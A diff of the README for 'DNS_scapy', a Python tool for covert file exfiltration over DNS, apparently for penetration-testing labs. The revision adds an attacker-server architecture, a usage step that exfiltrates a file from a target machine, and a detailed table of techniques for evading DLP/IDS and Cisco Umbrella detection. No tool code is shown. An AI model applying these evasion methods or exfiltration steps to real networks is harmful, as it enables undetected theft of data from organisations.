@@ -1,106 +1,112 @@
-# DNS_scapy - DNS Subdomain Exfiltration Tool
+# DNS_scapy - Stealth DNS Exfiltration Tool
 
-A covert file transfer utility that tunnels data through DNS subdomain queries using Scapy. Designed for penetration testing labs and educational purposes.
+A covert file transfer tool that tunnels data through DNS queries, designed to evade enterprise DLP/IDS systems. Built for penetration testing labs and security education.
 
-## How It Works
-
-File data is **base32-encoded into DNS subdomain labels**, making each packet look like a legitimate DNS lookup:
+## Architecture
 
 ```
-Normal DNS:     www.google.com                          → A record lookup
-Our traffic:    jbswy3dpeb3w64tmmq.0005.cdn-analytics.com  → looks similar
+Target Machine (client.py)       Network DNS Resolver        Attacker's Server (dns_server.py)
+──────────────────────────       ───────────────────        ────────────────────────────────
+1. Encode file data               Recursive resolution       1. Authoritative for domain
+2. Build DNS queries           ──> Resolver queries NS  ──> 2. Extract data from subdomains
+3. Send via system resolver        Caches & forwards         3. Respond with valid A records
+4. Mix with noise queries    <──  Returns response    <──  4. Reassemble & verify file
+5. Burst-silence timing           Standard DNS path          5. Save to disk
 ```
 
-### Flow
+Traffic flows through the network's normal DNS resolver - never direct to the attacker's IP.
 
+## Anti-Detection Features
+
+| Detection Vector | How We Evade |
+|-----------------|-------------|
+| **NXDOMAIN** | `dns_server.py` returns valid A records with CDN-range IPs (Cloudflare) |
+| **Entropy** | Hex-split: ~3.3 bits/char, Wordlist: ~2.0 bits/char (normal DNS is ~2.5) |
+| **Label length** | 8-14 chars (hex-split) or 3-6 chars (wordlist) — within normal range |
+| **Volume** | Spread over hours with burst-silence pattern, mixed with noise queries |
+| **Unique ratio** | ~75% unique (15% duplicate injection), vs 100% in naive tunneling |
+| **Timing** | Burst-silence mimics browser: 3-8 queries in 50-500ms, then 2-15s pause |
+| **Record types** | 70% A, 25% AAAA, 5% CNAME — matches real browsing distribution |
+| **Sequence pattern** | Obfuscated sequence numbers defeat Cisco Umbrella "sequence gluing" |
+
+## Encoding Strategies
+
+### Hex-Split (default)
+Data hex-encoded, split across short labels with CDN-like prefixes:
 ```
-Server (Sender)                    Network                         Client (Receiver)
-─────────────────                 ─────────────                   ──────────────────
-1. Read file                       DNS query (A/AAAA/TXT...)      1. Sniff DNS queries
-2. Compute SHA-256                                                2. Filter by base domain
-3. Split into 35-byte chunks                                      3. Extract subdomain data
-4. Base32-encode each chunk                                       4. Base32-decode chunks
-5. Send as subdomain queries ────> encoded.0001.cdn-analytics.com → 5. Sort by sequence number
-6. Random delays + jitter          (varies query types)           6. Reassemble file
-                                                                  7. Verify SHA-256 hash
+img3f2a1b.cdn7e9d04.s2c8a1.ab1f.0a3c.analytics-cdn.example.com
 ```
 
-### DLP Evasion Techniques
+### Wordlist
+Each byte mapped to a common English word (256-word dictionary):
+```
+book.rain.soft.tree.ab1f.0a3c.analytics-cdn.example.com
+```
 
-| Technique | What it does |
-|-----------|-------------|
-| **Subdomain encoding** | Data hidden in DNS query names, not in Padding/payload |
-| **Base32 encoding** | Only uses A-Z, 2-7 — valid DNS characters |
-| **Query type rotation** | Rotates A, AAAA, CNAME, TXT, MX — mimics normal browsing |
-| **Random source ports** | Each packet uses a different ephemeral port |
-| **Timing jitter** | Random delays between packets avoid pattern detection |
-| **Small chunks (35B)** | Subdomain lengths stay within normal DNS label limits (63 chars) |
-| **Realistic domain** | `cdn-analytics.com` looks like a legitimate CDN |
+## Setup
 
-### Protocol Details
-
-- **Transport:** UDP port 53
-- **Encoding:** Base32 in DNS subdomain labels
-- **Query format:** `<base32_data>.<seq_number>.<base_domain>`
-- **Metadata (seq 0000):** `chunk_count||sha256_hash` (also base32-encoded)
-- **Integrity:** SHA-256 hash verification
-
-## Requirements
-
+### Prerequisites
 - Python 3.6+
-- Root/sudo privileges (for raw packet access)
+- A domain you control with NS records pointing to your server
+- Root/sudo on the server machine
 
-## Installation
+### Installation
 
 ```bash
 pip install -r requirements.txt
 ```
 
+### Domain Setup
+1. Register/use a domain (e.g., `analytics-cdn.example.com`)
+2. Create NS record pointing to your server's IP
+3. Update `BASE_DOMAIN` in `config.py`
+
 ## Usage
 
-### Receiver first (client.py)
+### 1. Start the server (attacker machine)
 
 ```bash
-sudo python3 client.py
-# Enter sender IP: 192.168.1.10
-# Enter your local IP: 192.168.1.20
+sudo python3 dns_server.py
 ```
 
-### Then sender (server.py)
+### 2. Run the client (target machine)
 
 ```bash
-sudo python3 server.py
-# Enter destination IP: 192.168.1.20
-# Enter your IP: 192.168.1.10
-# Enter file path to send: secret.pdf
+python3 client.py
+# Enter file path to exfiltrate: /path/to/secret.pdf
 ```
 
-### Configuration
+The client uses the system's DNS resolver — no raw packet privileges needed.
+
+## Configuration
 
 Edit `config.py`:
 
 | Setting | Default | Description |
 |---------|---------|-------------|
-| `CHUNK_SIZE` | 35 | Raw bytes per chunk (base32 expands to ~56 chars) |
-| `BASE_DOMAIN` | cdn-analytics.com | Domain appended to queries |
-| `SEND_DELAY` | 0.3s | Base delay between packets |
-| `SEND_JITTER` | 0.2s | Random ± variation on delay |
-| `QUERY_TYPES` | A,AAAA,CNAME,TXT,MX | DNS types to rotate |
-| `MAX_RETRIES` | 5 | Client retry attempts |
-| `SNIFF_TIMEOUT` | 60 | Seconds to wait per phase |
+| `BASE_DOMAIN` | analytics-cdn.example.com | Your controlled domain |
+| `ENCODING_STRATEGY` | hex_split | `hex_split` or `wordlist` |
+| `NOISE_RATIO` | 3 | Noise queries per data query |
+| `BURST_SIZE_MIN/MAX` | 3 / 8 | Queries per burst |
+| `INTER_BURST_DELAY` | 2.0 - 15.0s | Pause between bursts |
+| `DUPLICATE_QUERY_RATE` | 0.15 | Rate of duplicate injection |
+| `QUERY_TYPE_WEIGHTS` | A:70 AAAA:25 CNAME:5 | Record type distribution |
+| `SEQUENCE_SEED` | 0xDEADBEEF | Shared secret for sequence obfuscation |
 
 ## Project Structure
 
 ```
 DNS_scapy/
-├── server.py          # Sender — encodes & sends DNS queries
-├── client.py          # Receiver — sniffs & decodes DNS queries
-├── config.py          # Shared configuration
-├── requirements.txt   # Python dependencies
+├── client.py           # Exfiltration sender (runs on target)
+├── dns_server.py       # Authoritative DNS receiver (runs on attacker)
+├── encoding.py         # Shared encoding module (hex-split + wordlist)
+├── config.py           # Shared configuration
+├── noise_domains.txt   # Popular domains for noise queries
+├── requirements.txt
 ├── .gitignore
 └── README.md
 ```
 
 ## Disclaimer
 
-This tool is intended for authorized penetration testing, educational purposes, and controlled lab environments only.
+For authorized penetration testing, CTF competitions, and security education in controlled lab environments only.
